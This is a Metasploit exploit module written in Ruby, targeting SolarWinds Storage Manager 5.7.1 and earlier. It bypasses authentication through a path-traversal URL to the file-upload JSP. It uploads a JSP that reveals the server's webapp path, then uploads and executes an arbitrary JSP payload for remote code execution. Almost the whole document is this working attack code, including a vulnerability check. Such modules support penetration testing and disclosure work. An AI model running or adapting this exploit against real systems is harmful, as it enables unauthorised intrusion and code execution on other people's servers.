##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'SolarWinds Storage Manager Authentication Bypass',
      'Description' => %q{
        This module exploits an authentication bypass vulnerability in Solarwinds Storage Manager.
        The vulnerability exists in the AuthenticationFilter, which allows to bypass authentication
        with specially crafted URLs. After bypassing authentication, is possible to use a file
        upload function to achieve remote code execution. This module has been tested successfully
        in Solarwinds Store Manager Server 5.1.0 and 5.7.1 on Windows 32 bits, Windows 64 bits and
        Linux 64 bits operating systems.
      },
      'Author'       =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['ZDI', '14-299']
        ],
      'Privileged'  => true,
      'Platform'       => %w{ linux win },
      'Arch'        => ARCH_JAVA,
      'Targets'     =>
        [
          ['Solarwinds Store Manager <= 5.7.1', {}]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 19 2014'))

    register_options(
      [
        Opt::RPORT(9000)
      ], self.class)
  end

  def check
    res = send_request_cgi({
                               'uri'    => normalize_uri("/", "images", "..", "jsp", "ProcessFileUpload.jsp"),
                               'method' => 'POST',
                               'ctype'  => "multipart/form-data; boundary=----#{rand_text_alpha(10 + rand(10))}"
                           })

    if  res && res.code == 200 && res.body && res.body.to_s =~ /Upload Successful!!/
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    jsp_info = "#{rand_text_alphanumeric(4 + rand(32-4))}.jsp"
    print_status("#{peer} - Uploading Information Gathering JSP #{jsp_info}...")
    if upload(jsp_info, jsp_path)
      print_good("#{peer} - JSP payload uploaded successfully")
    else
      fail_with(Failure::Unknown, "#{peer} - Information Gathering JSP upload failed")
    end

    res = execute(jsp_info)

    if res && res.code == 200 && res.body.to_s =~ /Path:(.*)/
      upload_path = $1
      print_good("#{peer} - Working directory found in #{upload_path}")
      register_file_for_cleanup(::File.join(upload_path, jsp_info))
    else
      print_error("#{peer} - Couldn't retrieve the upload directory, manual cleanup will be required")
      print_warning("#{peer} - #{jsp_info} needs to be deleted manually")
    end

    jsp_payload = "#{rand_text_alphanumeric(4 + rand(32-4))}.jsp"
    print_status("#{peer} - Uploading JSP payload #{jsp_payload}...")
    if upload(jsp_payload, payload.encoded)
      print_good("#{peer} - JSP payload uploaded successfully")
    else
      fail_with(Failure::Unknown, "#{peer} - JSP payload upload failed")
    end

    if upload_path
      register_file_for_cleanup(::File.join(upload_path, jsp_payload))
    else
      print_warning("#{peer} - #{jsp_payload} needs to be deleted manually")
    end

    print_status("#{peer} - Executing payload...")
    execute(jsp_payload, 1)
  end

  def execute(jsp_name, time_out = 20)
    res = send_request_cgi({
                         'uri'    => normalize_uri("/", "images", "..", jsp_name),
                         'method' => 'GET'
                     }, time_out)

    res
  end

  def upload(file_name, contents)
    post_data = Rex::MIME::Message.new
    post_data.add_part(contents,
                       "application/octet-stream",
                       nil,
                       "form-data; name=\"#{rand_text_alpha(4 + rand(4))}\"; filename=\"#{file_name}\"")

    res = send_request_cgi({
                               'uri'    => normalize_uri("/", "images", "..", "jsp", "ProcessFileUpload.jsp"),
                               'method' => 'POST',
                               'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
                               'data'   => post_data.to_s
                           })

    if  res && res.code == 200 && res.body && res.body.to_s =~ /Upload Successful!!/
      return true
    end

    false
  end

  def jsp_path
    jsp =<<-EOS
<%@ page language="Java" import="java.util.*"%>
<%
out.println("Path:" + System.getProperty("server.webapp.root"));
%>
    EOS

    jsp
  end

end